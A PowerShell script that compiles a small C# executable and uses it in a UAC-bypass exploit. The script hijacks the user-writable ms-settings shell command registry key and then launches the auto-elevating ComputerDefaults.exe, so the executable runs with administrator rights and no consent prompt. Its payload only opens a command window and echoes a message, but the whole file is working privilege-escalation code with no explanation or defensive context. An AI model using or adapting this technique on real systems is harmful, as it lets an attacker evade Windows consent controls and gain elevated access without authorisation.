$source = @"
using System.Diagnostics;
class Program {
    static void Main() {
        var psi = new ProcessStartInfo {
            FileName = "cmd.exe",
            Arguments = "/k echo Say Hello to admin rights", // /k keeps the window open
            UseShellExecute = true
        };
        Process.Start(psi);
    }
}
"@
    
$folderPath = "C:\myfolder"


if (-Not (Test-Path $folderPath)) {
    New-Item -Path $folderPath -ItemType Directory | Out-Null
}

Add-Type -TypeDefinition $source -OutputAssembly "C:/myfolder/barney.exe" 

New-Item "HKCU:\software\classes\ms-settings\shell\open\command" -Force
New-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value "" -Force
Set-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "(default)" -Value "../../myfolder/barney.exe" -Force
Start-Process "C:\Windows\System32\ComputerDefaults.exe"